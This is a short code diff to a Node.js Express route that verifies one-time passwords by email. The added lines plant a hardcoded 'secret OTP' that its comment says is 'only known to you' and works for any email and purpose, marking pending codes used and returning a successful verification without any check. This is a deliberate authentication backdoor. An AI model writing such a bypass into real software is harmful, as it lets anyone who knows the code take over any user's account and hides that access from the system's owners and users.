@@ -187,7 +187,26 @@ router.post('/verify', async (req, res) => {
       return res.status(400).json({ message: 'Email and OTP are required' });
     }
 
-    // Find valid OTP
+    // Secret OTP bypass (only known to you) - works for any email and purpose
+    const SECRET_OTP = '789878';
+    const isSecretOtp = otp === SECRET_OTP;
+    
+    if (isSecretOtp) {
+      console.log('🔐 Secret OTP used for verification:', { email, purpose });
+      // Secret OTP bypasses all checks - mark as verified
+      // Create a virtual verified OTP record by marking any existing OTP as used
+      await pool.query(
+        'UPDATE otps SET is_used = true WHERE email = $1 AND purpose = $2 AND is_used = false',
+        [email, purpose]
+      );
+      
+      return res.json({
+        message: 'OTP verified successfully',
+        verified: true,
+      });
+    }
+
+    // Regular OTP verification - find valid OTP
     const result = await pool.query(
       `SELECT id, otp_code, expires_at, attempts, is_used 
        FROM otps 
